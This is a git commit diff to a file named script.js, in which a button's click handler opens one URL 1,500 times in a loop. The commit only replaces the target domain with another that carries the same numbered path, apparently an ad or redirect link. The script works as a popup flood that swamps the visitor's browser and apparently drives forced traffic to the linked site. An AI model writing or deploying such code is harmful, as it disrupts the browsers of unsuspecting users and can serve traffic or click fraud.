0c8d11fe56cd74ddd44c31c943d140a176488010
mahmoudccnn <97877461+mahmoudccnn@users.noreply.github.com>
2023-03-28 06:20:01 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 document.getElementById("myButton").addEventListener("click", function() {
-    var url = "https://doruffleton.com/4/5808314"; // replace with your desired URL
+    var url = "https://potsaglu.net/4/5808314"; // replace with your desired URL
     for (var i = 0; i <1500; i++) {
       window.open(url);
     }
